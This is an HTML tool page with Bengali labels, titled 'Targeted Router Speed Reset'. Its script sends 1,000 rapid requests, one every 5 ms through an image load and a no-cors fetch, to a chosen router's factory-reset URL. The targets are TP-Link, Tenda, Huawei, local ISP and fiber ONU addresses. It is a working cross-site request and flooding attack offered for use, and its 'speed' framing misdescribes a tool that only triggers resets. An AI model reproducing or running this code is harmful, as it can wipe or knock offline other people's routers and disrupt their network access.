 lang="en">
<head>
    <meta charset="UTF-8">
    <title>Targeted Router Speed Reset</title>
    <style>
        body { font-family: monospace; margin: 0; background-color: #050505; color: #00ff66; text-align: center; padding: 20px; }
        .container { max-width: 600px; margin: auto; padding: 20px; background: #111; border: 2px solid #00ff66; border-radius: 10px; box-shadow: 0 0 25px rgba(0,255,102,0.3); }
        h2 { color: #00ff66; }
        label { display: block; margin-top: 15px; font-size: 14px; text-align: left; color: #aaa; }
        select { width: 100%; padding: 10px; margin-top: 5px; background: #222; color: #fff; border: 1px solid #00ff66; border-radius: 5px; font-size: 14px; }
        .btn { background: #00ff66; color: black; border: none; padding: 15px; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; margin-top: 20px; text-transform: uppercase; }
        .btn:hover { background: #00cc52; }
        #log-box { margin-top: 20px; padding: 12px; border-radius: 5px; text-align: left; font-size: 10px; max-height: 220px; overflow-y: auto; background: #000; border: 1px solid #333; color: #00ff66; }
    </style>
</head>
<body>

<div class="container">
    <h2>🎯 Targeted Speed Reset</h2>
    <p>তালিকা থেকে নির্দিষ্ট রাউটার সিলেক্ট করে রিকোয়েস্ট পাঠানোর টুল</p>

    <label for="routerSelect">টার্গেট রাউটার বা ওয়াইফাই সিলেক্ট করুন:</label>
    <select id="routerSelect">
        <option value="http://192.168.0.1/userRpm/SysToolResetRpm.htm">TP-Link (192.168.0.1)</option>
        <option value="http://192.168.1.1/userRpm/SysToolResetRpm.htm">TP-Link / Tenda (192.168.1.1)</option>
        <option value="http://192.168.8.1/html/reset.html">Huawei / Pocket Router (192.168.8.1)</option>
        <option value="http://192.168.10.1/reset.cgi">Local ISP Router (192.168.10.1)</option>
        <option value="http://192.168.100.1/html/reset.html">Fiber Optical ONU/Router (192.168.100.1)</option>
    </select>

    <button class="btn" onclick="startTargetedSpeed()">🚀 START TARGETED RESET</button>

    <div id="log-box">[READY] টার্গেট সিলেক্ট করে স্টার্ট বাটনে চাপুন...</div>
</div>

<script>
function startTargetedSpeed() {
    let logBox = document.getElementById('log-box');
    let selectedUrl = document.getElementById('routerSelect').value;
    
    logBox.innerHTML = `[!] সিলেক্টকৃত টার্গেটে রিকোয়েস্ট পাঠানো শুরু হচ্ছে: <br>${selectedUrl}<br><br>`;

    let count = 0;

    // প্রতি ৫ মিলিসেকেন্ডে সিলেক্ট করা টার্গেটে রিকোয়েস্ট পাঠানো (প্রতি সেকেন্ডে ২০০টি)
    let speedInterval = setInterval(() => {
        try {
            let img = new Image();
            img.src = selectedUrl + "?v=" + Math.random();

            fetch(selectedUrl, { mode: 'no-cors', cache: 'no-store' }).catch(() => {});

            count++;
            logBox.innerHTML += `[SENT #${count}] -> ${selectedUrl}<br>`;
            logBox.scrollTop = logBox.scrollHeight;
        } catch (e) {}

        // ১০০০ রিকোয়েস্ট হওয়ার পর থেমে যাবে
        if (count >= 1000) {
            clearInterval(speedInterval);
            logBox.innerHTML += `<br><span style="color: #00ff66; font-weight: bold;">[COMPLETED] সিলেক্টকৃত টার্গেটে ১০০০টি হাই-স্পিড রিকোয়েস্ট পাঠানো সম্পন্ন হয়েছে!</span>`;
            logBox.scrollTop = logBox.scrollHeight;
        }
    }, 5);
}
</script>

</body>
                                                                                       </html>
